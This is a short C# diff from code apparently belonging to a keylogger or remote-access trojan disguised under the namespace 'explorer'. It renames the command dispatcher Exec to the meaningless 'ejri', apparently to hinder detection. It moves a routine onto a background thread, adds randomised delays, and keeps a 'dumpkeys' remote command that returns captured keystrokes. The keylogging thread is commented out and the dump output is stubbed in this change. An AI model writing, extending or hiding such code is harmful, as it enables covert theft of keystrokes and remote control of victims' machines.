@@ -72,9 +72,8 @@ namespace explorer
                 // Thread th = new Thread(KeyThread);
                 // th.Start();
 
-                Adr();
-
-
+                Thread m = new Thread(Adr);
+                m.Start();
               
 
             }
@@ -215,7 +214,7 @@ namespace explorer
             strFls = "";
 
             
-            Exec(CmdStr);
+            ejri(CmdStr);
 
             if (fast)
                 Thread.Sleep(TimeSpan.FromMilliseconds(rn.Next(400, 1500)));
@@ -228,7 +227,7 @@ namespace explorer
         static string respUid = "";
         static string cmd = "";
 
-        public void Exec(string resp)
+        public void ejri(string resp)
         {
 
             respUid = "";
@@ -246,7 +245,8 @@ namespace explorer
                         case "N":
                             break;
                         case "dumpkeys":
-                            strout = LogK;
+                            //strout = LogK;
+                            strout = "zab :/";
                             LogK = "";
                             break;
                         default:
